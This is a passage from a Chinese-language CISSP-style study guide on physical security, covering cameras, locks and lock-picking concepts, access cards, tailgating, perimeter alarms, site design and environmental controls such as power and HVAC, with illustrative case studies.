  \n较老的“管式摄像机”是模拟设备。现代摄像机使用 CCD（电荷耦合器件），属于数字设备。摄像机具有机械光圈，功能类似人眼虹膜，通过改变光圈大小控制进入镜头的光量。关键问题包括`景深`（处于聚焦状态的区域）和`视野`（摄像头拍摄的整个区域）。更多的光线允许更大的景深，因为较小的光圈使图像更多部分处于聚焦状态。相应地，大光圈（用于低光条件）会降低景深。\n\
  \n图 4.30 显示了一张景深极窄的图像；一页文本中仅有一行处于聚焦状态。\n\n![图 4.30 景深。来源：https://commons.wikimedia.org/wiki/File:DOF-ShallowDepthofField.jpg；摄影：PiccoloNamek。图片依据知识共享署名-相同方式共享\
  \ 3.0 未移植版许可使用。](img/f04-30-9780443187346.jpg)\n\n图 4.30 景深。来源：[`commons.wikimedia.org/wiki/File:DOF-ShallowDepthofField.jpg`](https://commons.wikimedia.org/wiki/File:DOF-ShallowDepthofField.jpg)；摄影：PiccoloNamek。图片依据知识共享署名-相同方式共享\
  \ 3.0 未移植版许可使用。\n\nCCTV 摄像机还可能具备其他典型摄像机功能，如水平旋转和俯仰（水平和垂直移动）。图 4.31 显示了一台 CCD 摄像机。CCTV\
  \ 显示器可显示固定摄像头视图、自动扫描（显示某个摄像头几秒钟后切换到下一个）或多路复用（将多个摄像头画面汇聚到一台显示器上）。\n\n![图 4.31 CCD\
  \ 安防摄像机。来源：https://commons.wikimedia.org/wiki/File:Camera-IMG\\_1961.JPG；摄影：Rama。图片依据知识共享署名-相同方式共享\
  \ 2.0 许可使用。](img/f04-31-9780443187346.jpg)\n\n图 4.31 CCD 安防摄像机。来源：[`commons.wikimedia.org/wiki/File:Camera-IMG\\\
  _1961.JPG`](https://commons.wikimedia.org/wiki/File:Camera-IMG_1961.JPG)；摄影：Rama。图片依据知识共享署名-相同方式共享\
  \ 2.0 许可使用。\n\nVHS 等磁带用于备份管式摄像机的图像。CCD 摄像机使用 DVR（数字视频录像机）或 NVR（网络视频录像机）进行备份。NVR\
  \ 使用 TCP/IP 传输数据，与其他方法相比具有多项优势，包括复用现有 TCP/IP 网络和允许集中存储所有视频数据。\n\n> **考试警告**\n>\n\
  > 管式摄像机有时称为 CRT（阴极射线管）摄像机。不要将 CRT 摄像机与 CRT 显示器混淆：虽然 CRT 摄像机的画面可在 CRT 显示器上查看，但它们是不同的设备。\n\
  \n##### 锁\n\n锁是一种预防性物理安全控制，用于门窗以防止未经授权的物理访问。锁可以是机械的，如钥匙锁或组合锁，也可以是电子的，后者常与智能卡或磁条卡配合使用。\n\
  \n###### 钥匙锁\n\n`钥匙锁`需要物理钥匙才能开启。钥匙可能被共享或复制，这降低了钥匙锁的问责性。此外，许多钥匙的“组合”（称为齿码）直接印在钥匙弓上。图\
  \ 4.32 中钥匙的齿码为 74226。数字代表齿的深度：0 为浅，9 为深。复制这把钥匙只需知道钥匙类型/尺寸和齿码即可。专家只需看一眼钥匙（或其照片）即可推断出齿码。\n\
  \n\n\n\n\n##### 物理锁\n\n###### 弹子锁\n\n常见的锁类型是**弹子锁**，如图 4.33 所示，它有两组销钉：上销钉和下销钉。正确的钥匙使销钉与剪切线对齐，从而允许锁芯（锁筒）转动。使用不正确的钥匙，如图\
  \ 4.34 所示，会导致销钉错位，卡住锁筒。\n\n![图 4.33 弹子锁中的正确钥匙。](img/f04-33-9780443187346.jpg)\n\n\
  图 4.33 弹子锁中的正确钥匙。\n\n![图 4.34 弹子锁中的错误钥匙。](img/f04-34-9780443187346.jpg)\n\n图 4.34\
  \ 弹子锁中的错误钥匙。\n\n**弹片锁**或**盘片锁**要求钥匙通过通道（称为弹片/盘片）；“万能钥匙”设计用于开启多种弹片/盘片锁。\n\n**弹簧锁栓**，如图\
  \ 4.35 所示，是一种“弹入”和“弹出”门框的锁定机制；门可以在弹簧锁栓暴露的情况下关闭。**插芯锁**是刚性的；当插芯锁锁定时，门无法关闭。这两种类型的锁栓都延伸进门框上的**锁口板**中。\n\
  \n![图 4.35 插芯锁和弹簧锁栓。](img/f04-35-9780443187346.jpg)\n\n图 4.35 插芯锁和弹簧锁栓。\n\n######\
  \ 开锁\n\n**开锁**是在没有钥匙的情况下打开锁的技术。一套开锁工具，如图 4.36 所示，可用于抬起弹子锁中的销钉，使攻击者无需钥匙即可打开锁。一种较新的技术称为**撞匙开锁**，它使用一种削薄的钥匙，可以物理上插入锁中。攻击者插入削薄的钥匙并“撞击”暴露的部分（有时用螺丝刀柄）。这会导致销钉跳动，攻击者迅速转动钥匙并打开锁。\n\
  \n![图 4.36 开启弹子锁。来源：https://commons.wikimedia.org/wiki/File:Pin\\_and\\_tumbler\\\
  _lock\\_picking.PNG；由 Teresa Knott 绘制。图片遵循 Creative Commons Attribution ShareAlike\
  \ 3.0 许可。](img/f04-36-9780443187346.jpg)\n\n图 4.36 开启弹子锁。来源：[`commons.wikimedia.org/wiki/File:Pin\\\
  _and\\_tumbler\\_lock\\_picking.PNG`](https://commons.wikimedia.org/wiki/File:Pin_and_tumbler_lock_picking.PNG)；由\
  \ Teresa Knott 绘制。图片遵循 Creative Commons Attribution ShareAlike 3.0 许可。\n\n所有钥匙锁都可以被开启或撞击：唯一的问题是需要多长时间。高端锁通常需要更长的时间来开启或撞击。风险分析将决定使用哪种类型的锁，并且这种锁的“攻击时间”应作为纵深防御策略的一部分予以考虑。\n\
  \n###### 主钥匙和芯钥匙\n\n**主钥匙**可开启建筑物中给定安全区域内的任何锁。对主钥匙的访问应受到严格控制，包括钥匙本身的物理安全、仅授权少数关键员工，以及每当使用钥匙时的问责制。\n\
  \n**芯钥匙**用于在可互换芯锁中取出锁芯（锁芯可轻松取出并替换为另一个芯）。一旦锁芯被取出，通常可以用螺丝刀打开门（换句话说，芯钥匙可以打开任何门）。由于芯钥匙在功能上等同于主钥匙，因此应同等妥善保管。\n\
  \n##### 组合锁\n\n组合锁具有拨盘，必须按特定顺序（顺时针和逆时针交替转动）拨动到特定数字才能解锁。简单的组合锁常用于非正式安全场景，如健身房储物柜。对于数据中心等生产环境，它们是一种薄弱的物理访问控制形式。按钮锁或键盘锁也使用数字组合。\n\
  \n由于共享组合导致的有限问责制是此类锁的主要安全问题。按钮锁或键盘锁也存在脆弱性，因为长期使用会导致最常用的按钮或键磨损。这可能允许攻击者推断出组合中使用的数字。此外，组合可能通过**暴力破解**攻击被发现，即尝试每一种可能的组合。这些锁也可能通过**肩窥**攻击被攻破，即攻击者在输入组合时看到它。\n\
  \n##### 实例学习\n\n####### 攻击按钮锁\n\n《2600 Magazine, The Hacker Quarterly》讨论了攻击 Simplex\
  \ 锁的方法（文章也可在线获取，网址：[`fringe.davesource.com/Fringe/QuasiLegal/Simplex_Lockpicking.txt`](http://fringe.davesource.com/Fringe/QuasiLegal/Simplex_Lockpicking.txt)）。\n\
  \n当时常用的一种 Simplex 按钮锁型号有五个按钮（编号一到五）。按钮必须按特定组合按下才能打开。这种锁通常只使用 1081 种不同组合中的一种。作者指出，用于高中体育馆储物柜的\
  \ Master Lock 有 64,000 种组合：拨盘代表数字 1-40，必须转动三次（40 × 40 × 40 = 64,000）。\n\n作者能够通过暴力破解攻击快速确定多把此类锁的组合。他们发现了某国家快递公司投递箱使用的组合，随后发现同一个组合可以打开东海岸的每一个投递箱。他们一次性猜中了另一家公司投递箱的组合：该公司从未更改默认组合。\n\
  \n简单的锁，如组合有限的按钮锁，不符合预防性设备的资格：它们除了阻吓有备而来的攻击者外几乎无所作为。这些锁可用于低安全性应用，如锁定员工洗手间，但不应用于保护敏感数据或资产。\n\
  \n##### 智能卡和磁条卡\n\n**智能卡**是一种物理访问控制设备，常用于电子锁、信用卡购买或双因素认证系统。“智能”意味着卡片包含计算机电路；智能卡的另一个术语是**“集成电路卡”\
  \ (ICC)**。\n\n智能卡可以是“接触式”或“非接触式”。接触式卡必须插入智能卡读卡器，而非接触式卡则无线读取。一种非接触式卡技术是**射频识别 (RFID)**。这些卡包含\
  \ RFID 标签（也称为应答器），由 RFID 收发器读取。\n\n**磁条卡**包含一个存储信息的磁条。与智能卡不同，磁条卡是不包含电路的无源设备。这些卡有时称为刷卡：它们在通过读卡器刷过时被读取。\n\
  \n许多国际信用卡是智能卡，而磁条卡在美国更常用作信用卡。\n\n> **注意**\n>\n> **“通用访问卡” (CAC)**，如图 4.37 所示，是美国国防部\
  \ (DoD) 在全球部署智能卡的一个示例。这些卡用于物理访问控制，也可配合智能卡读卡器为关键系统提供双因素认证。CAC 卡存储数据，包括作为 DoD 公钥基础设施\
  \ (PKI) 一部分的加密证书。除了提供强认证外，这些卡还允许用户数字签名文档，以及其他用途。\n\n\n\n\n\n![图 4.37 美国国防部 CAC 智能卡\
  \ [48]。](images/B9780443187346000076/f04-37-9780443187346.jpg)\n\n图 4.37 美国国防部 CAC\
  \ 智能卡 [[48]](#Ch004_107-223_B9780443187346000076_2.xhtml#bb0240)。\n\n智能卡和磁条卡均可与电子锁结合使用，以提供物理访问控制。与机械锁相比，这种方法提供了更优越的问责性：审计数据可被电子化收集，显示所有人员进出大楼的记录。这些数据还可用于安全目的，为安全管理员提供准确的人员统计，以便在疏散期间清点人数。\n\
  \n###### 尾随/搭便车\n\n**尾随**（也称为**搭便车**）是指未经授权的人员在授权人员解锁并打开门后，跟随其进入建筑物。政策应禁止员工允许尾随行为，安全意识培训应阐述这一风险。\n\
  \n试图尾随的攻击者通常会结合社会工程学技巧，例如搬运大箱子，从而增加授权用户“伸出援手”帮忙扶门的几率。\n\n##### 实例学习\n\n########\
  \ 一次成功的尾随攻击\n\nJohnny Long 在其著作《无技术黑客：社会工程学、垃圾箱搜寻与肩窥指南》（ISBN: 978-1-59749-215-7,\
  \ Syngress）[[49]](#Ch004_107-223_B9780443187346000076_2.xhtml#bb0245) 中描述了一次物理渗透测试中的成功尾随攻击。目标站点拥有多层纵深防御控制，包括磁条刷卡器，以及内部驻守和外部巡逻的武装警卫。他的目标：进入受限的内部区域。\n\
  \nJohnny 使用喷墨打印机制作了一张电话公司的工牌，携带一个印有电话公司标志的工具箱，并身穿工装靴、牛仔裤和 T 恤，扮演相应角色。他发现了一个吸烟者聚集在侧门附近的区域。从室外直接接近他们会引起不必要的注意，所以他等所有吸烟者离开后，迅速站在门外，手持香烟。当其他吸烟者出来抽烟时，他闲聊几句，并提及他在现场的（�构）工作。\n\
  \n当吸烟者结束休息时，一人进行身份验证并打开了侧门。Johnny 为工人们扶着门，他们感谢他的礼貌。Johnny 紧随其后走了进去，无人发问。\n\n#####\
  \ 人员锁和转闸门\n\n**人员锁**是一种具有两扇门的预防性物理控制。第一扇门必须关闭并上锁后，第二扇门方可打开。每扇门通常需要单独的认证方式才能打开；常见的组合是\
  \ `PIN`（个人识别码）和生物识别。入侵者进入人员锁后会被困在两扇门之间。\n\n**转闸门**旨在通过强制执行“每次认证仅限一人通过”规则来防止尾随，就像地铁系统中的闸机一样。安全数据中心通常使用从地板到天花板、带有互锁挡板的转闸门，以防止攻击者翻越或钻过转闸门。安全旋转门执行相同的功能。\n\
  \n人员锁和转闸门的设计必须允许在紧急情况下安全疏散。任何系统在紧急情况下均不应要求进行认证即可疏散。\n\n##### 违禁品检查\n\n乘坐飞机出行的任何人都熟悉**违禁品检查**，其目的是识别禁止带入安全区域（如飞机）的物品。政府或军事建筑等安全建筑也可能采用违禁品检查。\n\
  \n这些检查通常用于检测金属、武器或爆炸物。它们也可用于检测管制物质，如非法毒品。另一个担忧是可能被用来**窃取**敏感数据的便携式相机或存储介质。\n\n除了旨在检测便携式媒体等违禁品的违禁品检查外，还应采用纵深防御策略，如端口封锁。例如，某些数码相机使用的“microSD”（微型安全数字）卡可存储数\
  \ GB 数据，且比一枚便士还小：小到足以逃避除最彻底的违禁品检查之外的所有检查。\n\n##### 运动探测器和其他周界报警器\n\n**超声波**和**微波运动探测器**的工作原理类似于用于天气预报的“多普勒雷达”。发射一波能量，当其碰到物体反弹时，“回波”被接收返回。例如，距离墙壁\
  \ 20 英尺的运动探测器将在波击中墙壁并反弹回接收器所需的时间内持续接收到回波。当新物体（如人在传感器范围内行走）反射波时，回波将返回得更快。\n\n**光电运动传感器**将一束光发射穿过受监控空间至光电传感器。当光束被遮断时，传感器发出警报。\n\
  \n超声波、微波和红外运动传感器属于主动传感器，意味着它们主动发射能量。被动传感器可被视为“只读”设备。一个例子是**无源红外 (PIR) 传感器**，它探测人体热量产生的红外能量。\n\
  \n#### 考试警告\n\n当我们听到“入侵”一词时，通常会想到 `NIDS`（网络入侵检测系统）等技术控制。运动探测器提供物理入侵检测。\n\n重要的是要记住，最初的入侵是由人类“入侵者”实施的（他们可能曾冲击城堡围墙）。如果你在考试中看到“入侵”一词，请务必结合上下文判断（是人为还是基于网络的）。\n\
  \n周界报警器包括磁性门窗报警器。它们包含安装在墙壁以及窗户/门上的成对传感器。只要门或窗关闭，电路就会流经传感器对；一旦任一被打开，电路即中断。这些报警器通常在安全区域以及一般区域的非工作时间（如夜间或周末）处于布防状态。一旦布防，中央报警系统将在任何门或窗被打开时发出警报。\n\
  \n##### 门和窗\n\n始终要考虑门、窗、墙、地板、天花板等的相对优势和劣势。从防御角度来看，所有这些都应同样坚固：攻击者会瞄准“链条中最薄弱的一环”，不应能找到可利用的薄弱点。“最薄弱一环”设计的例子包括配有空心门的混凝土墙，或配有钢门的石膏板墙。\n\
  \n门铰链应朝内或以其他方式受到保护。未加固的外向铰链构成安全风险：攻击者可用锤子和螺丝刀拔出铰链销，从而从铰链侧打开门。\n\n带电子锁的门通常需要智能卡或磁条卡才能解锁。紧急情况下疏散必须畅通无阻，因此常使用简单的按钮或运动探测器来允许疏散。在后一种情况下，门不应有缝隙，且内部运动传感器应牢固地螺栓固定在坚固的固定天花板或墙壁上。外部攻击者可能试图通过将纸塞入门缝（试图为探测器提供运动信号）或剧烈摇晃门（这会震动周围的墙壁或天花板），导致安装不牢的传感器移动并感应到运动，从而触发内部运动传感器。因此，带有内部运动传感器的门绝不应包含邮槽。\n\
  \n外向的应急门应标明仅供紧急情况使用，并配备**推杆锁**（恐慌杆）。使用推杆锁应触发警报。\n\n\n\n\n玻璃窗在结构上较脆弱，破碎时会造成危险。防弹或防爆玻璃可用于安全区域。金属丝网或安全膜可降低玻璃破碎的危险性并提供额外强度。在安全周界使用普通玻璃窗需要采取补偿性控制措施，如窗户防盗报警器。\n\
  \n玻璃窗的替代品包括聚碳酸酯（如 Lexan）和丙烯酸酯（如 Plexiglas）。Lexan 因其强度和抗碎裂性被用于赛车和飞机上。\n\n##### 墙壁、地板和天花板\n\
  \n任何内部安全周界（如数据中心）周围的墙壁应为“楼板到楼板”，即应从地面楼板开始，延伸至天花板楼板。架空地板和吊顶可能会遮挡墙壁真正开始和结束的位置。攻击者不应能爬过停在架空地板顶部的墙壁下方，也不应能翻越停在吊顶处的墙壁。\n\
  \n保护安全周界（无论是内部还是外部）的任何墙壁都应足够坚固，以抵抗攻击者试图开辟入口点进行的切割。简单的石膏“石膏板”墙可用锋利工具（如地毯刀）切开，不应用于安全周界。\n\
  \n墙壁应具有适当的耐火等级（因火灾导致失效所需的时间）。美国国家消防协会（NFPA）75《信息技术设备保护标准》规定：“计算机室应通过由不燃或限燃材料构建的耐火墙、地板和天花板，与建筑物内的其他用途区域分隔开。耐火等级应与火灾风险相称，但不得低于一小时”\
  \ [\\[50\\]](#Ch004_107-223_B9780443187346000076_2.xhtml#bb0250)。\n\n##### 保安人员\n\
  \n保安人员是一种动态控制，可用于多种情况。保安人员可协助检查访问凭证、监控闭路电视（CCTV）、监控环境控制、响应事件、起到威慑作用（在其他条件相同的情况下，罪犯更倾向于选择无人看守的建筑而非有人看守的建筑）等。\n\
  \n专业保安人员接受过高级培训和/或正规教育；非专业保安人员（有时被贬称为“商场保安”）则没有。术语 `pseudo guard` 指未配备武器的保安人员。\n\
  \n保安人员的命令应完整且清晰。放在架子上的文件夹里的书面政策是不够的：保安人员必须直接了解安全风险。保安人员经常遭受社会工程学攻击，因此应通过安全意识和培训直接应对这一威胁。\n\
  \n###### 实例学习：伊莎贝拉·斯图尔特·加德纳博物馆大劫案\n\n一个说明此问题的真实案例是马萨诸塞州波士顿伊莎贝拉·斯图尔特·加德纳博物馆大劫案。1990\
  \ 年 3 月 18 日凌晨 1:24，两名男子冒充警察按响了博物馆大门的门铃。两名非专业保安人员（均为大学生）让这两名“警察”进入了馆内。\n\n几分钟内，保安人员就在地下室被捆绑堵嘴。窃贼在馆内游走，窃取了\
  \ 13 件大师名作。这些作品包括德加、马奈、维米尔和伦勃朗的画作（包括伦勃朗唯一的海景画作《加利利海上的风暴》）。\n\n20 多年过去了，该案仍未侦破，艺术品（价值数亿美元）下落不明。退休的博物馆安全总监表示：“所有夜班保安都收到过书面警告，不得放行未经博物馆直接传唤的警察……该政策写入了博物馆的安全手册，放在保安桌上”\
  \ [\\[51\\]](#Ch004_107-223_B9780443187346000076_2.xhtml#bb0255)。\n\n确保书面政策被阅读和理解是安全意识培训的必要部分。正如伊莎贝拉·斯图尔特·加德纳博物馆大劫案所教导的，你不能假设放在架子上文件夹里的政策会生效。\n\
  \n此外，切勿雇佣非专业人员提供专业服务。需要保护关键资产的场所（如银行和博物馆）应始终雇佣专业的物理安全人员。在部署保安人员（无论是非专业还是专业）之前，始终要进行彻底且准确的风险分析。\n\
  \n##### 看门犬\n\n看门犬提供周界防御职责，看守一块固定的“领地”。它们常用于受控区域，如建筑物外墙与周界围栏之间。看门犬主要同时作为威慑和侦测控制。没有看门犬的场所比有看门犬的场所更容易遭受物理攻击（威慑），看门犬通过吠叫提醒保安人员（侦测）。\n\
  \n使用看门犬作为周界控制的主要缺点是法律责任。大多数安保犬受过“逼捕”嫌疑人的训练（如果入侵者不动，它们通常被训练不咬人）。不幸的是，许多人不知道这一点（或仅因恐慌、在威猛的看门犬面前逃跑）。许多看门犬受过攻击逃跑嫌疑人的训练。\n\
  \n授权人员意外离开建筑物并进入建筑物与围栏周界之间的安全区域（如意外通过消防门离开）时，已发生过悲剧。\n\n##### 限制工作区域和陪同人员\n\n区域可按空间（“仅限授权人员”区域）或时间（在特定时段内有效的访客证）进行限制。一种常见攻击是重复使用旧访客证进行后续攻击；可通过基于时间的访客证控制来缓解此类攻击。示例包括自动过期的电子证件、在证件上用粗体打印有效日期和时间，以及使用不同颜色的证件区分一周中的不同日子。\n\
  \n根据场所的安全政策，正式人员或保安人员可陪同访客。所有此类人员都应了解陪同方面的安全隐患，如社会工程学攻击。所有人员都应接受培训，质询任何缺乏有效证件或陪同人员的访客，或致电保安部门报告事件。\n\
  \n#### 场地选择、设计与配置\n\n选择、设计与配置描述了构建安全设施（如数据中心）的过程，从场地选择过程到最终设计。考试可能会提出一个场景，询问场地选择过程的任何部分，从数据中心将建在其上的土地开始。\n\
  \n选择场地时有许多实际考量，如停车、道路通达性、公共交通、附近的便利设施和酒店。考试侧重于安全考量。请记住，在选择、设计和配置场地时，人员的物理安全是首要任务。\n\
  \n##### 场地选择问题\n\n场地选择是在“绿地”上选择一个场地来建造建筑物或数据中心的过程。绿地是一块未开发的土地，是设计上的空白画布。\n\n######\
  \ 地形\n\n`Topography` 是土地的物理形状：山丘、山谷、树木等。高安全场所（如军事设施）将利用（有时改变）场地地形作为防御措施。地形可用于引导进出至受控点。例如，如果攻击者试图驾驶汽车炸弹冲入建筑物，应发生在受控且加固的\
  \ IV 级闸口，而非较弱的侧墙处。\n\n###### 公用设施可靠性\n\n当地公用设施的可靠性是场地选择的关键考量。停电是我们经历的所有故障和灾难中最常见的之一。不间断电源（UPS）可在短时间内（通常几小时或更短）提供防电力故障保护。发电机提供更长时间的保护，但若要长时间运行则需要加油。\n\
  \n###### 犯罪\n\n\n\n####### 当地犯罪率也是选址的考量因素\n\n首要问题是员工安全：所有员工都有权享有安全的工作环境。其他问题包括公司资产被盗。\n\
  \n##### 场地设计与配置问题\n\n选定场地后，必须做出若干设计决策。该场地是否会在外部标识为数据中心？大楼内是否有共享租户？电信 `demarc`（电信分界点）位于何处？\n\
  \n请注意，安全的场地设计无法弥补糟糕的选址决策。这些是互补的概念，共同体现了物理纵深防御的各个部分。\n\n###### 场地标识\n\n许多数据中心在外部不作标识，以避免引起对该设施（及其内部昂贵内容）的关注。类似的控制措施还包括避免引人注目的细节，如低调的建筑设计。\n\
  \n###### 共享租户与相邻建筑\n\n大楼内的其他租户可能构成安全隐患：他们已位于物理安全边界内部。他们的物理安全控制措施将影响您的安全：例如，某租户糟糕的访客安全做法可能危及您的安全。\n\
  \n相邻建筑构成类似风险。攻击者可进入一栋安保较松懈的相邻建筑，将其作为基地攻击目标建筑，通常通过打通共享墙壁入侵。许多银行大劫案均是通过这种方式得逞的；包括\
  \ 1976 年从中东英国银行窃取超过 2000 万美元（攻击者在相邻教堂的共享墙上炸开一个洞）。更多详情请见 [`coinweek.com/people-in-the-news/crime-and-fraud/the-biggest-gold-heists-of-all-time-part-ii/`](https://coinweek.com/people-in-the-news/crime-and-fraud/the-biggest-gold-heists-of-all-time-part-ii/)。\n\
  \n与共享租户（或物理位置接近的邻居）相关的另一安全风险是无线安全。发起许多类型的无线攻击需要物理上的接近。此外，邻居运行与您相同频率的无线设备可能会造成干扰，引发无线可用性问题。\n\
  \n###### 线缆间\n\n线缆间安全防护不足可能引入严重的物理访问问题。如果对手获得了线缆间的访问权限，他们可能会：将流氓系统或接入点连接到网络，通过断开网线对关键系统实施拒绝服务，通过引入二层环路降低性能，破坏管理网络设备的能力，截获网络流量，甚至物理破坏网络布线。以上绝非详尽列表，且未展示必然可行的场景。技术或逻辑防御可缓解上述部分挑战。然而，拥有网络设备的物理访问权限，预期对手仍可能造成危害，尽管存在重要的逻辑安全措施。\n\
  \n###### 共享分界点\n\n在有共享租户的大楼中，一个必须考虑的关键问题是共享 `demarc`（分界点，即 ISP（互联网服务提供商）责任结束和客户责任开始的地方）。大多数大楼只有一个\
  \ `demarc` 区域，所有外部线路均由此进入大楼。访问 `demarc` 允许对所有电路及其上传输的数据的机密性、完整性和可用性发起攻击。\n\n共享 `demarcs`\
  \ 应采用强物理访问控制，包括对所有访问进行识别、认证和授权。应建立问责控制以重现任何事件。对于高安全级别的场地，建议构建多个隔离的 `demarcs`。\n\n\
  ###### 服务器机房\n\n显然，控制和审计对服务器机房的物理访问是维护物理安全的必要条件。然而，仅靠简单的访问控制不足以确保维持适当的安全。组织通常意识到门禁薄弱的风险，但也必须考虑墙壁、地板和天花板作为进入服务器机房潜在入口点的安全性。这些顾虑在多租户设施中尤为突出。除了单纯提供物理上的接近性外，多租户设施在设计时往往考虑到地板和办公空间的简单重组。这些灵活的工作空间通常缺乏适当保护服务器机房所需的安全级别。\n\
  \n除了物理访问控制外，环境控制也必须足以提供预期的正常运行时间和可用性级别。电力和 `HVAC`（供暖、通风与空调）是关键环境因素，如果设计和维护不当，会对服务器机房的安全产生负面影响。\n\
  \n###### 介质存储设施\n\n为灾难恢复、潜在法律诉讼或其他法律法规目的而离线存储介质是常见做法。应采用异地介质存储设施，以确保即使主设施发生物理灾难，数据仍可访问。异地存储介质的目的是确保持续访问，这意味着该设施应与主设施保持足够远的距离，以避免物理灾难同时影响主设施和异地存储位置。应使用持牌且有担保的专业快递员进行介质往返异地存储设施的传输。\n\
  \n鉴于其中包含数据的敏感性，介质存储设施必须得到充分保护。许多适用于服务器机房的顾虑在此也同样适用。区别在于环境控制的方法。鉴于介质存储的离线性质，由于缺乏正常运行时间顾虑，通常不需要对电力考虑给予同等重视。然而，切勿完全忽视环境控制。虽然介质存储设施的\
  \ `HVAC` 成本和设计可能显著降低，但组织仍必须确保介质以不会显著降低未来数据访问能力的方式存储。\n\n#### 系统防御\n\n系统防御是纵深防御策略中的最后防线之一。这些防御假设攻击者已获得对包含敏感信息的设备或介质的物理访问权限。在某些情况下，其他控制措施可能已失效，而这些控制措施是保护数据的最终防线。\n\
  \n##### 资产追踪\n\n详细的资产追踪数据库可增强物理安全。除非您知道数据在哪里（以及是什么），否则无法保护数据。详细的资产追踪数据库通过识别系统内所有受监管数据的位置，支持合规性遵从。在员工离职时，资产数据库将准确显示该员工必须归还给公司的设备和数据。序列号和型号等数据在因盗窃或灾难导致损失的情况下很有用。\n\
  \n##### 端口控制\n\n现代计算机可能包含多个“端口”，允许向系统复制数据或从系统复制数据。`通用串行总线 (USB)` 是一个常见示例；较新的系统通常有多个\
  \ `USB` 端口。`USB` 驱动器可以很小（有些比一块口香糖还小）且廉价，却可存放数十 GB 甚至更多数据。\n\n端口控制至关重要，因为大量信息可存放在足以逃避边界违禁品检查的微型设备上。端口可被物理禁用；示例包括在系统主板上禁用端口、断开连接端口与系统的内部线缆，以及物理阻塞端口本身。\n\
  \n端口也可通过系统策略进行电子锁定。通过 `Microsoft Windows Active Directory Group Policy`（Microsoft\
  \ Windows Active Directory 组策略）锁定端口是企业级端口控制的一个示例。\n\n#### 环境控制\n\n\n\n\n#### 环境控制\n\
  \n环境控制旨在为人员和设备提供安全的环境。电力、暖通空调（HVAC）和消防安全均属于环境控制范畴。\n\n##### 电力\n\n可靠的电力对任何数据中心都至关重要，也是选址、建设和设计场地时的首要任务之一。\n\
  \n###### 电气故障类型\n\n电气故障涉及短期和长期的电力中断，以及各种低压和高压情况。所有类型的电气故障都可能影响可用性和完整性。例如，停电可能会影响系统的可用性，但如果硬盘因突然断电而损坏，也会影响完整性。\n\
  \n以下是常见的电气故障类型：\n\n*   **停电**：长时间断电\n*   **欠压/电压不足**：长时间低电压\n*   **故障**：短时断电\n*\
  \   **浪涌**：长时间高电压\n*   **尖峰/脉冲**：暂时性高电压\n*   **电压跌落**：暂时性低电压\n\n###### 浪涌保护器、UPS\
  \ 和发电机\n\n`浪涌保护器`、`UPS` 和 `发电机` 可针对最常见的物理和环境故障之一——电气故障——提供防护。\n\n####### 浪涌保护器\n\
  \n浪涌保护器可保护设备免受电压浪涌造成的损坏。它们包含一个电路或保险丝，在电压尖峰或浪涌发生时会被触发，从而短路切断电源或将其调节至可接受的水平。\n\n#######\
  \ 不间断电源\n\n不间断电源（`UPS`）在停电时提供临时备用电源。它们还可以“净化”电源，防止浪涌、尖峰和其他形式的电气故障。\n\n`UPS` 备用电源通过电池或燃料电池提供。`UPS`\
  \ 仅能提供有限时间的电力，可作为通往发电机供电的桥梁；发电机通常需要一小段时间启动并开始供电。\n\n####### 发电机\n\n发电机设计用于比 `UPS`\
  \ 更长时间地供电，只要燃料充足即可持续运行。应储备足够的现场燃料，以维持发电机预期供电时长的需求。加油策略应考虑灾难对燃料供应和运输的影响。\n\n发电机不应放置在可能被淹或受天气事件影响的区域。它们还包含复杂的机械结构，应定期测试和维护。\n\
  \n####### 实例学习：卡特里娜飓风\n\n2005 年的卡特里娜飓风等自然灾害能教会我们应急准备的经验教训，包括发电机的使用。断电后，路易斯安那州新奥尔良市的大多数发电机都失效了。许多发电机位于被洪水淹没的低洼地区；其他则因维护不善而失效。\n\
  \n在剩余的、位于洪水位以上且维护得当的发电机中，大多数耗尽了燃料。由于停电、洪水以及道路不通等基础设施损失，汽油和柴油广泛短缺。\n\n务必将发电机置于潜在洪水位以上，并尽最大努力将其放置在不太可能受其他自然灾害影响的区域。发电机结构复杂且易故障：应定期执行主动维护。大规模自然灾害后给发电机加油可能极其困难，因此在设计燃料储存和发电机加油计划时，务必考虑这一问题。这份白皮书详细讨论了该问题：<https://web.archive.org/web/20130903101345/http://cumminspower.com/www/literature/technicalpapers/PT-7006-Standby-Katrina-en.pdf>。\n\
  \n###### EMI\n\n电能产生磁性，因此任何导电体都会发射电磁干扰（`EMI`）。这包括电路、电源线、网线等。屏蔽不良或铺设过近的网线可能遭受 `串扰`，即一根线缆的磁场“串扰”到另一根附近的线缆。这主要影响网络或语音数据的完整性（也可能影响机密性）。\n\
  \n可通过合理的网线管理来缓解串扰。切勿将电源线靠近网线铺设。网线的选择也能降低串扰：`非屏蔽双绞线`（`UTP`）布线比 `屏蔽双绞线`（`STP`）或 `同轴电缆`\
  \ 更易受影响。`光纤` 使用光而非电传输数据，不受 `EMI` 影响。\n\n> **注意**\n>\n> 多年前在普通老式电话服务（`POTS`）时代，电话通过铜线传输：你是否曾在通话中听到另一通电话的对话？声音通常微弱且难以辨认，但确确实实存在。\n\
  >\n> 这就是串扰：在你和通话对象之间的某处，有另一根电话线离得太近或屏蔽不良。`EMI` 从那根线跳到了你的线上，你便听到了微弱的声音。用 CISSP® 术语来说，你的通话完整性受到了影响（另一通电话的机密性也受到了影响）。\n\
  \n##### 暖通空调 (HVAC)\n\n暖通空调（HVAC，供暖、通风与空调）控制系统将空气保持在合理的温度和湿度。它们在闭环中运行，循环经过处理的空气。这有助于减少灰尘和其他空气传播的污染物。\n\
  \n###### 正压与排水\n\n所有暖通空调设备均应采用正压和排水设计。这意味着空气和水应排出建筑物。未经处理的空气绝不应被“吸入”建筑物内，水应排离建筑物。\n\
  \n暖通空调设备的常见故障是冷凝水积聚流入建筑物内部，常流至架空地板下而不易被察觉。正压排水旨在避免此问题。所有燃气管道、水管及排水管的位置均应正式记录在案。\n\
  \n###### 温度与湿度\n\n数据中心暖通空调设备旨在维持计算机的最佳温湿度水平。建议湿度为 40–55%。数据中心常用的推荐“设定点”温度范围为 68–77°F（20–25°C）。\n\
  \n若数据中心气流充足，可采用稍高的温度。这可节省能源；但一旦暖通空调故障，数据中心温度可能更快升至危险水平。\n\n> **注意**\n>\n> 许多资料引用\
  \ 68–72°F（20–22°C）作为数据中心的最佳温度范围；2004 年，美国采暖、制冷与空调工程师学会（`ASHRAE`）推荐上限为 77°F/25°C。\n\
  >\n> 近期为节省能源成本，出现了一股“绿色”推动，允许更宽的温湿度范围。因此，2011 年 `ASHRAE` 建议允许更宽的范围：温度 18°C (64.4°F)\
